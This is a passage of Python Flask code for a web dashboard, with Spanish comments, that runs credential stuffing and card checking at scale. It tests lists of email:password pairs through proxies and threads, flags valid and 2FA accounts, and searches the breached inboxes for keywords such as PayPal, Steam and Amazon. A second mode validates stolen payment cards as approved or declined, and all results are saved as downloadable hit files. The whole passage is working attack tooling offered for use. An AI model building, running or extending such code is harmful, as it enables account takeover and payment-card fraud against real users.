            country = 'Unknown'
            
            if graph_token:
                if checker.get_profile_via_graph(graph_token):
                    country = checker.country or 'Unknown'
                    country_obtained = True
            
            if not country_obtained:
                if checker.get_profile_via_substrate():
                    country = checker.country or 'Unknown'
            
            total_count, inbox_hits = checker.check_inbox()
            
            if total_count > 0:
                hits_str = ' | '.join(inbox_hits)
                save_string = f"{email}:{password} | {country} | {total_count} Email Found | [{hits_str}]"
                checker_state['results']['inbox'].append(save_string)
                
                with threading.Lock():
                    checker_state['stats']['inbox'] += 1
                
                add_log(f"📬 {email} - INBOX HITS: {total_count} emails ({country}) | {hits_str}", 'success')
                
            else:
                checker_state['results']['valid'].append(f"{email}:{password} | {country}")
                add_log(f"✅ {email} - VALID ({country})", 'success')
            
        elif status == '2FA':
            with threading.Lock():
                checker_state['stats']['2fa'] += 1
            checker_state['results']['2fa'].append(f"{email}:{password}")
            add_log(f"🔐 {email} - 2FA REQUIRED", 'warning')
            
        else:
            with threading.Lock():
                checker_state['stats']['bad'] += 1
            checker_state['results']['bad'].append(f"{email}:{password}")
            add_log(f"❌ {email} - INVALID", 'error')
    
    except Exception as e:
        with threading.Lock():
            checker_state['stats']['errors'] += 1
        checker_state['results']['errors'].append(f"{email}:{str(e)}")
        add_log(f"⚠️ {email} - ERROR: {str(e)}", 'error')
    
    finally:
        with threading.Lock():
            checker_state['stats']['checked'] += 1
        update_stats()

# ============================================
# RUTAS DE LA API
# ============================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/start', methods=['POST'])
def start_checking():
    if checker_state['running']:
        return jsonify({'error': 'Already running'}), 400
    
    data = request.json
    check_type = data.get('type', 'email')  # 'email' o 'card'
    
    if check_type == 'email':
        accounts = parse_accounts(data.get('accounts', ''))
        keywords = parse_keywords(data.get('keywords', ''))
        proxies = parse_proxies(data.get('proxies', ''))
        threads = int(data.get('threads', CONFIG['threads']))
        
        if not accounts:
            return jsonify({'error': 'No valid accounts found'}), 400
        
        if not keywords:
            keywords = ["Steam", "Netflix", "PayPal", "Amazon", "Security Alert"]
        
        checker_state['running'] = True
        checker_state['stats'] = {
            'checked': 0, 'valid': 0, 'inbox': 0, 'custom': 0,
            'bad': 0, '2fa': 0, 'errors': 0, 'retries': 0, 'cpm': 0,
            'total': len(accounts)
        }
        checker_state['results'] = {'valid': [], 'inbox': [], '2fa': [], 'bad': [], 'errors': [],
                                   'approved': [], 'declined': [], 'invalid': [], 'pending': []}
        checker_state['card_results'] = []
        checker_state['logs'] = []
        checker_state['start_time'] = time.time()
        checker_state['session_folder'] = None
        checker_state['export_ready'] = False
        checker_state['export_files'] = []
        
        get_session_folder()
        
        add_log(f"🚀 Iniciando verificación de {len(accounts)} cuentas", 'info')
        add_log(f"📝 Keywords: {', '.join(keywords)}", 'info')
        add_log(f"📡 Proxies: {len(proxies)}", 'info')
        add_log(f"⚙️ Hilos: {threads}", 'info')
        add_log(f"📁 Session folder: {get_session_folder()}", 'info')
        
        thread = threading.Thread(target=run_checker_email, args=(accounts, keywords, proxies, threads))
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'success': True,
            'total': len(accounts),
            'type': 'email'
        })
    
    elif check_type == 'card':
        cards_text = data.get('cards', '')
        cards = parse_cards(cards_text)
        proxies = parse_proxies(data.get('proxies', ''))
        threads = int(data.get('threads', 5))  # Menos threads para Selenium
        
        if not cards:
            return jsonify({'error': 'No valid cards found'}), 400
        
        checker_state['running'] = True
        checker_state['stats'] = {
            'checked': 0, 'valid': 0, 'inbox': 0, 'custom': 0,
            'bad': 0, '2fa': 0, 'errors': 0, 'retries': 0, 'cpm': 0,
            'total': len(cards)
        }
        checker_state['results'] = {'valid': [], 'inbox': [], '2fa': [], 'bad': [], 'errors': [],
                                   'approved': [], 'declined': [], 'invalid': [], 'pending': []}
        checker_state['card_results'] = []
        checker_state['logs'] = []
        checker_state['start_time'] = time.time()
        checker_state['session_folder'] = None
        checker_state['export_ready'] = False
        checker_state['export_files'] = []
        
        get_session_folder()
        
        add_log(f"💳 Iniciando verificación de {len(cards)} tarjetas", 'info')
        add_log(f"📡 Proxies: {len(proxies)}", 'info')
        add_log(f"⚙️ Hilos: {threads}", 'info')
        add_log(f"📁 Session folder: {get_session_folder()}", 'info')
        
        thread = threading.Thread(target=run_checker_cards, args=(cards, proxies, threads))
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'success': True,
            'total': len(cards),
            'type': 'card'
        })
    
    return jsonify({'error': 'Invalid check type'}), 400

def run_checker_email(accounts, keywords, proxies, max_threads):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for account in accounts:
                if not checker_state['running']:
                    break
                email, password = account.split(':', 1)
                future = executor.submit(check_account, email, password, keywords, proxies)
                futures.append(future)
            
            for future in concurrent.futures.as_completed(futures):
                if not checker_state['running']:
                    break
                try:
                    future.result()
                except:
                    pass
    finally:
        checker_state['running'] = False
        elapsed = time.time() - checker_state['start_time']
        add_log(f"✅ Verificación completada en {int(elapsed)}s", 'success')
        add_log(f"📊 Válidos: {checker_state['stats']['valid']} | Inbox: {checker_state['stats']['inbox']} | 2FA: {checker_state['stats']['2fa']} | Inválidos: {checker_state['stats']['bad']}", 'info')
        add_log(f"📁 Resultados guardados en: {get_session_folder()}", 'info')
        checker_state['export_ready'] = True
        update_export_files_list()

def run_checker_cards(cards, proxies, max_threads):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for card in cards:
                if not checker_state['running']:
                    break
                future = executor.submit(check_card, card, proxies)
                futures.append(future)
            
            for future in concurrent.futures.as_completed(futures):
                if not checker_state['running']:
                    break
                try:
                    future.result()
                except:
                    pass
    finally:
        checker_state['running'] = False
        elapsed = time.time() - checker_state['start_time']
        add_log(f"✅ Verificación de tarjetas completada en {int(elapsed)}s", 'success')
        
        # Resumen de tarjetas
        approved = sum(1 for r in checker_state['card_results'] if r['status'] == 'APPROVED')
        declined = sum(1 for r in checker_state['card_results'] if r['status'] == 'DECLINED')
        invalid = sum(1 for r in checker_state['card_results'] if r['status'] == 'INVALID')
        pending = sum(1 for r in checker_state['card_results'] if r['status'] == 'PENDING')
        
        add_log(f"📊 APROBADAS: {approved} | DECLINADAS: {declined} | INVALIDAS: {invalid} | PENDIENTES: {pending}", 'info')
        add_log(f"📁 Resultados guardados en: {get_session_folder()}", 'info')
        checker_state['export_ready'] = True
        update_export_files_list()

def update_export_files_list():
    folder = get_session_folder()
    files = []
    
    if os.path.exists(folder):
        for f in os.listdir(folder):
            if f.endswith('.txt'):
                path = os.path.join(folder, f)
                files.append({
                    'name': f,
                    'path': path,
                    'size': os.path.getsize(path)
                })
    
    checker_state['export_files'] = files

@app.route('/api/stop', methods=['POST'])
def stop_checking():
    checker_state['running'] = False
    add_log("⏹️ Detenido por el usuario", 'warning')
    return jsonify({'success': True})

@app.route('/api/status', methods=['GET'])
def get_status():
    update_stats()
    return jsonify({
        'running': checker_state['running'],
        'stats': checker_state['stats'],
        'logs': checker_state['logs'][:50],
        'results': checker_state['results'],
        'card_results': checker_state['card_results'][-20:],
        'session_folder': get_session_folder(),
        'export_ready': checker_state['export_ready'],
        'export_files': checker_state['export_files']
    })

@app.route('/api/download/<path:filename>', methods=['GET'])
def download_file(filename):
    folder = get_session_folder()
    path = os.path.join(folder, filename)
    if os.path.exists(path):
        return send_file(path, as_attachment=True, download_name=filename)
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/download/inbox', methods=['GET'])
def download_inbox():
    folder = get_session_folder()
    path = os.path.join(folder, 'Inbox.txt')
    if os.path.exists(path):
        return send_file(path, as_attachment=True, download_name='Inbox.txt')
    return jsonify({'error': 'No inbox results found'}), 404

@app.route('/api/download/valid', methods=['GET'])
def download_valid():
    folder = get_session_folder()
    path = os.path.join(folder, 'Valid.txt')
    if os.path.exists(path):
        return send_file(path, as_attachment=True, download_name='Valid.txt')
    return jsonify({'error': 'No valid results found'}), 404

@app.route('/api/download/approved', methods=['GET'])
def download_approved():
    folder = get_session_folder()
    path = os.path.join(folder, 'Approved.txt')
    if os.path.exists(path):
        return send_file(path, as_attachment=True, download_name='Approved.txt')
    return jsonify({'error': 'No approved cards found'}), 404

@app.route('/api/download/all', methods=['GET'])
def download_all():
    folder = get_session_folder()
    zip_filename = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder)
                zipf.write(file_path, arcname)
    
    return send_file(zip_filename, as_attachment=True, download_name=zip_filename)

@app.route('/api/files', methods=['GET'])
def list_files():
    update_export_files_list()
    return jsonify({
        'files': checker_state['export_files'],
        'session_folder': get_session_folder()
    })

@app.route('/api/config', methods=['GET'])
def get_config():
    return jsonify(CONFIG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
